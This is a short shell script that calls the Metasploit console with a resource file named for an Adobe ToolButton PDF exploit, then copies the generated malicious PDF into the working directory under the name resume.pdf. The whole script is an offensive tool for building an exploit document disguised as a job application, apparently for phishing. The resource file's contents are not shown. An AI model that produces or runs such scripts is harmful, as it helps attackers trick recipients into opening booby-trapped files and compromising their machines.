clear
echo '[+] Generating resume.pdf using Metasploit Framework...'
msfconsole -r adobe_toolbutton_pdf_exploit.rc
mv -f $HOME/.msf4/local/resume.pdf . 
echo '[+] Done generating resume.pdf!'
